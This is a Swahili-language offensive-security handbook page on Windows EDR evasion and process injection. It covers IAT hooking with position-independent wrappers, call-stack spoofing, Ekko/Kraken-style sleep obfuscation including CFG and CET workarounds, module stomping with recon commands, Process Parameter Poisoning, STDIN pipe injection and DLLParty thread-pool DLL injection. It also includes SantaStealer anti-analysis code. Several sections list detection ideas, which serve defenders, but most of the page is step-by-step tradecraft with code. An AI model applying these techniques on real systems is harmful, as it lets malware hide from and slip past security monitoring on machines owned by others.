Red teams zinaweza kuhamishia runtime evasion kutoka kwenye C2 implant hadi kwenye target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza API zilizochaguliwa kupitia code inayodhibitiwa na mshambuliaji, iliyo position-independent (PIC). Hii huongeza wigo wa evasion zaidi ya API chache zinazotolewa na kits nyingi (k.m., CreateProcessA), na kupanua ulinzi huohuo hadi kwa BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Weka PIC blob pamoja na target module ukitumia reflective loader (iliyotangulizwa au companion). PIC lazima ijitosheleze na iwe position-independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe IAT entries za imports zilizolengwa (k.m., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) ili zielekeze kwenye PIC wrappers nyembamba.
- Kila PIC wrapper hutekeleza evasions kabla ya kuita API halisi kwa tail-call. Evasions za kawaida ni pamoja na:
  - Kuficha/kufichua memory kabla na baada ya call (k.m., encrypt beacon regions, RWX→RX, kubadilisha majina/ruhusa za kurasa), kisha kurejesha hali ya awali baada ya call.
  - Call-stack spoofing: tengeneza stack isiyo na shaka na uingie kwenye target API ili call-stack analysis ipate frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa uoanifu, toa interface ili Aggressor script (au inayolingana nayo) iweze kusajili API za ku-hook kwa Beacon, BOFs na post-ex DLLs.

Kwa nini utumie IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyo-hookiwa, bila kubadilisha code ya tool au kutegemea Beacon ku-proxy API mahususi.
- Hushughulikia post-ex DLLs: ku-hook LoadLibrary* hukuwezesha kuingilia upakiaji wa modules (k.m., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyohiyo kwenye API calls zake.
- Hurejesha matumizi ya kuaminika ya post-ex commands zinazozindua processes dhidi ya detections zinazotegemea call-stack kwa kuzungushia CreateProcessA/W wrappers.

Muhtasari mdogo wa IAT hook (pseudocode ya x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Maelezo
- Tumia patch baada ya relocations/ASLR na kabla ya import kutumiwa kwa mara ya kwanza. Reflective loaders kama TitanLdr/AceLdr zinaonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo sana na salama kwa PIC; tatua API halisi kwa kutumia thamani ya awali ya IAT uliyonasa kabla ya kuweka patch, au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na uepuke kuacha kurasa zikiwa writable+executable.

Call-stack spoofing stub
- PIC stubs za mtindo wa Draugr huunda mnyororo bandia wa miito (return addresses ndani ya modules zisizo na madhara), kisha huingia kwenye API halisi.
- Hii huzuia detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Ziunganishe na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya prologue ya API.

Ujumuishaji wa uendeshaji
- Weka reflective loader kabla ya DLL za post-ex ili PIC na hooks zianzishe kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili APIs lengwa ili Beacon na BOFs zinufaike kwa uwazi na njia hiyo hiyo ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazotatua hadi anwani zisizo za image (heap/anon); ukaguzi wa mara kwa mara wa import pointers.
- Hitilafu za Stack: return addresses zisizohusiana na images zilizopakiwa; mipito ya ghafla kwenda kwenye PIC isiyo ya image; ukoo wa RtlUserThreadStart usiolingana.
- Telemetry ya Loader: writes za ndani ya process kwenda kwenye IAT, shughuli za mapema za DllMain zinazobadilisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa kupakia.
- Kuepuka image-load: ukifanya hooking ya LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa automation/clr assemblies unaohusishwa na matukio ya masking ya memory.

Vipengele vya ujenzi vinavyohusiana na mifano
- Reflective loaders zinazofanya IAT patching wakati wa kupakia (k.m., TitanLdr, AceLdr)
- Hooks za memory masking (k.m., simplehook) na PIC ya stack-cutting (stackcutting)
- PIC stubs za call-stack spoofing (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks kupitia PICO inayobaki

Ikiwa unadhibiti reflective loader, unaweza kufanya hooking ya imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tengeneza **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifuta.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (k.m., `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie utafutaji wa hooks unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, elekeza ombi kwa `GetProcAddress` halisi.
- Sajili targets za hook wakati wa link kwa entries za Crystal Palace `addhook "MODULE$Func" "hook"`. Hook itaendelea kuwa halali kwa sababu iko ndani ya resident PICO.

Hii husababisha **uelekezaji upya wa IAT wakati wa import** bila kufanya patch kwenye code section ya DLL iliyopakiwa baada ya kupakiwa.

### Kulazimisha imports zinazoweza kufanyiwa hooking wakati target inatumia PEB-walking

Import-time hooks huanzishwa tu ikiwa function ipo kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya `ProcessImports()` ya loader iione:

- Badilisha utatuzi wa exports kwa hash (k.m., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na rejeleo la moja kwa moja kama `&WaitForSingleObject`.
- Compiler huunda entry ya IAT, na hivyo kuwezesha interception wakati reflective loader inatatua imports.

### Sleep/idle obfuscation ya mtindo wa Ekko bila kufanya patch ya `Sleep()`

Badala ya kufanya patch ya `Sleep`, fanya hooking ya **primitives halisi za wait/IPC** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, zungushia mwito kwenye mnyororo wa obfuscation wa mtindo wa Ekko unaosimba image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kupanga mfululizo wa callbacks zinazoita `NtContinue` kwa kutumia `CONTEXT` frames zilizotengenezwa maalum.
- Mnyororo wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → ifanye RC4 encryption kupitia `advapi32!SystemFunction032` kwenye image nzima iliyomapishwa → tekeleza wait inayozuia → ifanye RC4 decryption → **rejesha ruhusa za kila section** kwa kupitia PE sections → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa kiolezo cha `CONTEXT`; ki-clone kwenye frames nyingi na weka registers (`Rip/Rcx/Rdx/R8/R9`) ili kuendesha kila hatua.

Maelezo ya uendeshaji: rudisha “mafanikio” kwa waits ndefu (k.m., `WAIT_OBJECT_0`) ili caller iendelee huku image ikiwa imefichwa. Muundo huu huficha module dhidi ya scanners wakati wa vipindi vya idle na huepuka saini ya kawaida ya “patched `Sleep()`”.

Mawazo ya Detection (yanayotegemea telemetry)
- Milipuko ya callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- Matumizi ya `advapi32!SystemFunction032` kwenye buffers kubwa, mfululizo na zenye ukubwa wa image.
- `VirtualProtect` ya range kubwa ikifuatiwa na urejeshaji maalum wa ruhusa kwa kila section.

### Usajili wa CFG wakati wa runtime kwa sleep-obfuscation gadgets

Kwenye targets zilizo na CFG, indirect jump ya kwanza kwenda kwenye gadget ya katikati ya function kama `jmp [rbx]` au `jmp rdi` kwa kawaida itasababisha process ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget hiyo haipo kwenye metadata ya CFG ya module. Ili kuweka hai chains za mtindo wa Ekko/Kraken ndani ya processes zilizoimarishwa:<sup>[[30]](#references)</sup>

- Sajili kila indirect destination inayotumiwa na chain kupitia `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na entries za `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya images zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ifunike **ukubwa wote wa image**.
- Kwa maeneo yaliyomapishwa kwa mkono/PIC/stomped, tumia **allocation base** na ukubwa wa allocation badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sections zozote zinazoweza kutekelezwa, zinazodhibitiwa na mshambuliaji na zitakazokuwa indirect targets.

Hii hugeuza sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye processes zisizo na CFG” kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizokompiliwa kwa `/guard:cf`.

### CET-safe stack spoofing kwa threads zinazolala

Kubadilisha `CONTEXT` yote kunaonekana wazi na kunaweza kusababisha matatizo kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyoghushiwa lazima bado ilingane na hardware shadow stack. Muundo salama zaidi wa sleep-masking ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine kwenye process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB yake (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa kutumia `GetThreadContext`.
- Nakili **`Rip` halisi pekee** kwenye spoof context, na uache hali ya `Rsp`/stack iliyoghushiwa kama ilivyo.
- Wakati wa kipindi cha sleep, nakili `NT_TIB` ya spoof thread ndani ya TEB ya sasa ili stack walkers zifanye unwind ndani ya range halali ya stack.
- Baada ya wait kuisha, rejesha TIB na thread context ya awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha EDR stack walkers zinazotegemea metadata ya stack ya TEB kuthibitisha unwinds.

### Njia mbadala inayotumia APC: Kraken Mask

Ikiwa timer-queue dispatch ina saini inayotambulika mno, mfuatano huohuo wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwenye helper thread iliyosimamishwa kwa kutumia APCs zilizowekwa kwenye foleni:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Weka `CONTEXT` frames/APCs zilizotayarishwa kwenye foleni kwa `NtQueueApcThread` na zitekeleze kwa `NtAlertResumeThread`.
- Hifadhi hali ya chain kwenye heap badala ya stack ya helper ili kuepuka kuishiwa na thread stack ya kawaida ya KB 64.
- Tumia `NtSignalAndWaitForSingleObject` kutoa ishara ya start event na kuzuia kwa njia ya atomiki.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza dirisha la race ambapo scanner inaweza kunasa stack iliyorejeshwa nusu.

Hii hubadilisha saini ya `CreateTimerQueueTimer` + `NtContinue` na kuwa saini ya helper-thread/APC huku ikiendeleza malengo yale yale ya RC4 masking na stack-spoofing.

Mawazo ya ziada ya Detection
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya sleeps, waits, au APC dispatch.
- `GetThreadContext`/`SetThreadContext` zinazotumika pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject`, au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazofikia kwa njia isiyo ya moja kwa moja `SystemFunction032`, `VirtualProtect`, au helpers za kurejesha ruhusa za sections.
- Matumizi yanayojirudia ya saini fupi za gadgets kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizosainiwa.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka kwenye **`.text` section ya DLL ambayo tayari imeomapishwa ndani ya process lengwa**, badala ya kutenga memory ya faragha inayoweza kutekelezwa na inayoonekana wazi au kupakia DLL mpya ya kutumika kama kafara. Lengo la overwrite linapaswa kuwa **image iliyopakiwa kutoka diski**, ambayo code space yake inaweza kuchukua payload bila kuharibu njia za code ambazo process bado inahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Uchaguzi wa target unaotegemeka

Stomping ya kawaida dhidi ya modules za kawaida kama `uxtheme.dll` au `comctl32.dll` si thabiti: DLL inaweza kuwa haijapakiwa kwenye remote process, na code region iliyo ndogo mno inaweza kusababisha process ku-crash. Mchakato unaotegemeka zaidi ni:

1. Orodhesha modules za process lengwa na ubakize **orodha ya kujumuisha yenye majina pekee** ya DLL zilizopakiwa tayari.
2. Tengeneza payload kwanza na urekodi **ukubwa wake halisi wa bytes**.
3. Changanua DLL zinazoweza kuwa targets kwenye diski na ulinganishe PE section **`.text` `Misc_VirtualSize`** na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa faili kwa sababu huakisi ukubwa wa executable section **inapomapishwa kwenye memory**.
4. Changanua **Export Address Table (EAT)** na uchague RVA ya function iliyosafirishwa kama offset ya kuanzia ya stomp.
5. Kokotoa **blast radius**: ikiwa payload inazidi mpaka wa function iliyochaguliwa, itafuta exports jirani zilizopangwa baada yake kwenye memory.

Helpers za kawaida za recon/uchaguzi zinazoonekana kwenye mazingira halisi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Vidokezo vya utekelezaji
- Pendelea DLLs **ambazo tayari zimepakuliwa** kwenye process ya mbali ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa image usiotarajiwa.
- Pendelea exports ambazo programu lengwa haitumii mara chache; vinginevyo, njia za kawaida za utekelezaji zinaweza kufikia bytes zilizostomp kabla au baada ya kuunda thread.
- Mara nyingi implants kubwa huhitaji kubadilisha jinsi shellcode inavyopachikwa: badala ya string literal, tumia **byte-array/braced initializer** ili buffer nzima iwakilishwe ipasavyo kwenye source ya injector.

Mawazo ya utambuzi
- Uandishi wa mbali kwenye kurasa za executable zinazoungwa mkono na image (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za export ambazo bytes zake zilizo kwenye memory hazilingani tena na faili husika iliyo kwenye diski.
- Remote threads au context pivots zinazoanza kutekelezwa ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mfuatano wa kutiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` unaolenga kurasa za DLL `.text`, ukifuatiwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya uandishi wa mbali (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye process inayolengwa ambayo tayari inaendeshwa, hutumia ukweli kwamba Windows **hunakili vigezo teule vya uanzishaji vya `CreateProcessW` kwenye child process** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Njia za kubebea data zinazoweza kutiwa sumu na kunakiliwa na `CreateProcessW`

Njia muhimu za kubebea data ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vikwazo vya matumizi ya njia hizi:

- `lpCommandLine` lazima ielekeze kwenye memory inayoweza kuandikwa ili `CreateProcessW` ifanye kazi, na ina kikomo cha **herufi 32,767 za Unicode** ikijumuisha terminator null.
- `lpEnvironment` lazima iwe block ya environment ya Unicode yenye mfuatano wa string za `NAME=VALUE\0` zinazofuatana, zinazofungwa na `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hiyo ulinganishaji wa `ShellInfo` unapaswa kuchukuliwa kuwa maelezo ya utekelezaji badala ya mkataba thabiti ulioandikwa kwenye nyaraka.

Hii hugeuza uundaji wa kawaida wa process kuwa **primitive ya kuhamisha payload**. Mwendeshaji huunda child process kwa data ya uanzishaji inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye nakala kati ya processes.

### Mchakato wa kutafuta data ya mbali bila API za uandishi wa mbali

Baada ya child kuundwa, tafuta buffer iliyonakiliwa kwa kutumia primitives za **kusoma pekee**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma `PEB` ya mbali
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza buffer ya parameter iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida ni `RW`, si la kutekelezeka. Msururu wa kawaida wa P3 ni:

1. Unda process kawaida (bila kuisimamisha)
2. Fanya ukurasa wa parameter uliochaguliwa uweze kutekelezeka kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread ambayo tayari imerudishwa kwenye `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, andika juu ya `RIP`)

Tofauti na mifumo ya kawaida ya thread hijacking, hili **halihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kupitia handle ya main thread iliyorudishwa.

Hili huepuka API kadhaa zinazofuatiliwa mara nyingi kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na shellcode ya hatua kwa hatua

Carrier zote tatu ni **data ya string au inayofanana na string**, kwa hivyo payload ghafi iliyo na `0x00` hukatizwa wakati wa uhamishaji. Suluhisho la vitendo ni kutumia **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa runtime, kisha kupakia hatua ya pili ya aina yoyote.

Mfumo rahisi ni usanisi wa constant kwa kutumia XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This huruhusu hatua ya kwanza kuunda strings za stack, arguments za API, paths za DLL, au loader ya shellcode ya hatua ya pili bila kuweka null bytes kwenye parameter inayosafirishwa.

### Miito ya API inayotumia stack kutoka hatua ya kwanza

Wakati hatua ya kwanza lazima iite APIs kama `LoadLibraryA`, inaweza:

- kusukuma string/buffer kwenye stack ya target
- kutenga **32-byte x64 shadow space**
- kuweka `RCX`, `RDX`, `R8`, `R9` ziwe constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` imepangiliwa kwa **16-byte** kabla ya mwito

Kisha hatua ya pili inaweza kunakiliwa kutoka stack hadi allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kurukwa hadi, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya utambuzi

Fursa nzuri za kutafuta zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kufanya **kurasa za process-parameter ziwe executable**
- mabadiliko hayo ya ulinzi yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu au zenye entropy ya juu isiyo ya kawaida wakati wa kuunda process

### Vidokezo

- P3 ni **mbinu ya kuhamisha data kati ya processes**, si primitive kamili ya execution yenyewe: parameter iliyonakiliwa bado inahitaji mabadiliko ya ruhusa za execution na mbinu ya kuelekeza execution.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na waandishi lakini ikakataliwa kwa sababu ndani yake hufikia primitives zinazotiliwa shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Console STDIN pipe injection

Child ya console inayoingiliana pia inaweza kutumiwa kama **primitive ya kuhamisha payload**. Injector huelekeza standard input ya child kwenye pipe na kutuma marker ikifuatiwa na shellcode. Programu ya console inaposoma data kwenye memory yake binafsi, injector hupata buffer hiyo, huifanya iwe executable na kuelekeza thread ya child huko. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection badala ya EDR bypass ya jumla.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", implementation ya rejea huita `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia pipe objects zenye majina ya kipekee ndani yake, lakini PoC haichagui path ya `\\.\pipe\<name>` wala haiiti `CreateNamedPipe`. Huunda handles zinazoweza kurithiwa kwa kutumia security descriptor chaguomsingi, huweka read handle kwenye `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na kuzindua child mpya huku handle inheritance ikiwa imewashwa. Kwa hiyo, PoC hii huzindua console executable iliyotolewa; haiunganishi pipe yake na process iliyopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa kazi wa rejea

Implementation hutumia mlolongo ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za child. Zima inheritance kwenye handles mbili za upande wa parent na funga nakala za upande wa child ndani ya parent baada ya kuunda process.
2. Zindua executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa `CREATE_NEW_CONSOLE`. Child hurithi standard handles zilizoelekezwa upya.
3. Tuma array kamili ya binary ya `rawData` kwa `WriteFile` kupitia handle ya `STDIN` ya upande wa parent. Programu ya console hutumia bytes hizo na kuacha nakala katika mojawapo ya maeneo yake binafsi yaliyocommitiwa.
4. Pitia address space ya child kwa `VirtualQueryEx`, soma maeneo yanayoweza kuwa `MEM_PRIVATE` kwa `ReadProcessMemory`, na utafute marker mwanzoni mwa `rawData`.
5. Badilisha buffer iliyopatikana iwe `PAGE_EXECUTE_READWRITE` kwa `VirtualProtectEx`.
6. Tambua main thread, isitishe, weka `RIP` iwe `found_address + 0x19` kwa `NtSetContextThread`, kisha iendeleze.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni mahususi kwa x64: hurekebisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni x64 shellcode. `rawData` huanza na alama yenye urefu wa baiti 25, kwa hiyo baiti zinazotekelezeka huanza kwenye offset ya hexadecimal `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au sasisha alama, vector ya utafutaji, ukubwa wa array na offset ya utekelezaji kwa pamoja. Maoni ya source pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama herufi zisizofaa. Workflow hii haibadilishi token au privileges za child.<sup>[[41]](#references)</sup>

Kwa mifumo ya kuandaa native helpers ndogo na ku-compili payload, angalia [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Thread-pool callback DLL injection bila shellcode (DLLParty)

DLLParty hurekebisha thread-pool injection ya mtindo wa PoolParty ili kufanya worker aliyepo kwenye target aitie `LoadLibraryA`, badala ya kutekeleza callback stub iliyoingizwa. Primitive yake ya dispatch ni completion ya `TP_DIRECT` inayowekwa kwenye foleni ya I/O completion port ya target pool. Hii haibypass ruhusa za process: PoC huita `OpenProcess(PROCESS_ALL_ACCESS)` na inahitaji kumbukumbu ya target inayoweza kusomeka/kuandikika pamoja na handles za worker-factory na completion-port zinazoweza kunakiliwa.<sup>[[46]](#references)[[47]](#references)</sup>

Kwenye Windows x64, worker hupitisha pointer ya `TP_CALLBACK_INSTANCE` iliyo kwenye stack yake kupitia `RCX`, argument ya kwanza ya callback. `LoadLibraryA` hutafsiri pointer hiyo hiyo kama `LPCSTR`. Kwenye njia iliyojaribiwa, `TppWorkerThread` huunda pointer kwenye `RSP+0x178`, ilhali write yake ya kwanza ya kawaida kwenye object hiyo huwa kwenye `RSP+0x1d0`. Kwa hiyo, njia ya DLL iliyo na null terminator na inayotoshea ndani ya prefix hii ya baiti 0x58 inaweza kuwekwa mwanzoni mwa instance bila kufutwa kabla ya dispatch. Huu ni uchunguzi maalum kwa build husika, si dhamana iliyoandikwa kwenye Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Workflow ya rejea ni:<sup>[[46]](#references)[[47]](#references)</sup>

1. Orodhesha handles za target kwa kutumia `NtQuerySystemInformation(SystemHandleInformation)` na utambue `TpWorkerFactory` kwa kuuliza aina za object. Nakili handle ya worker-factory na uulize `WorkerFactoryBasicInformation`; `StartParameter` hutoa `TP_POOL` ya remote. Ruka factories zenye `TotalWorkerCount == 0`.
2. Soma `TP_POOL.CompletionPort` na pitia orodha binafsi ya workers ya pool. Kwenye build ya Windows 10 19045 x64 iliyojaribiwa (`ntdll.dll 10.0.19041.4842`), kichwa chake kiko kwenye `pool+0x60`; kila link iko kwenye `worker+0x10`, kwa hiyo slot ya callback-instance kwenye `worker+0x38` ni sawa na `link+0x28`. PoC hukagua mpangilio wa pointer, ulinganifu wa links, umiliki wa pool, thread IDs zisizo sifuri, nodes zilizojirudia na kichwa cha orodha kisichobadilika.
3. Andika njia ya DLL kwenye sloti **zote** za workers zilizopatikana kwa sababu completion iliyowekwa kwenye foleni inaweza kuchukuliwa na worker yeyote. Weka `TP_DIRECT` yenye `Callback = LoadLibraryA` kwenye kumbukumbu ya target inayoweza kuandikwa. PoC hutumia `last_slot-0x500` kwenye stack ya worker badala ya `VirtualAllocEx`; offset hiyo ni ya majaribio na haipaswi kugongana na data inayotumika ya stack.
4. Nakili handle ya completion-port ya target na uite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Anwani ya remote `TP_DIRECT` ndiyo completion key. Kisha worker aliyepo huita `LoadLibraryA` kwa kutumia pointer yake ya callback-instance iliyobadilishwa, na kupakia DLL ambayo tayari inapatikana kwa target.

PoC hupokea PID ya target (`DLLParty.exe <target_pid>`) na hutumia njia ya DLL iliyowekwa moja kwa moja kwenye `DLLParty.cpp`; weka njia inayoweza kufikiwa na target kabla ya kuunda executable ya x64. Pia hutumia anwani ya `LoadLibraryA` ya process yake yenyewe kama callback ya remote, kwa hiyo inadhania anwani hiyo ni halali kwenye target. Code haikague urefu wa njia dhidi ya prefix ya baiti 0x58 wala kama upitishaji wa workers ulipata slot kabla ya kufikia kipengele cha mwisho. Thibitisha upya offsets binafsi, mpangilio wa stack na nafasi inayoweza kuandikwa kwa build ya target. Kuacha `CreateRemoteThreadEx`, shellcode na `VirtualAllocEx` hakuondoi writes za cross-process au telemetry ya upakiaji wa DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Mbinu za SantaStealer za Kuepuka Uchanganuzi Bila Faili na Kuiba Credentials

SantaStealer (pia huitwa BluelineStealer) inaonyesha jinsi info-stealers za kisasa huchanganya AV bypass, anti-analysis na ufikiaji wa credentials katika workflow moja.<sup>[[24]](#references)</sup>

### Kuzuia kwa mpangilio wa kibodi na kuchelewesha sandbox

- Alama ya config (`anti_cis`) huorodhesha mpangilio wa kibodi uliosakinishwa kupitia `GetKeyboardLayoutList`. Ikiwa mpangilio wa Cyrillic utapatikana, sample huacha alama tupu ya `CIS` na kusitisha utekelezaji kabla ya kuendesha stealers, hivyo kuhakikisha haijawahi kulipuka kwenye maeneo yaliyotengwa huku ikiiacha artifact inayoweza kutafutwa.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Mantiki ya `check_antivm` yenye tabaka

- Variant A hupitia orodha ya michakato, huhesabu hash ya kila jina kwa checksum maalum ya rolling, na kulinganisha matokeo na blocklist zilizopachikwa za debugger/sandbox; hurudia checksum hiyo kwa jina la kompyuta na kukagua saraka za kazi kama `C:\analysis`.
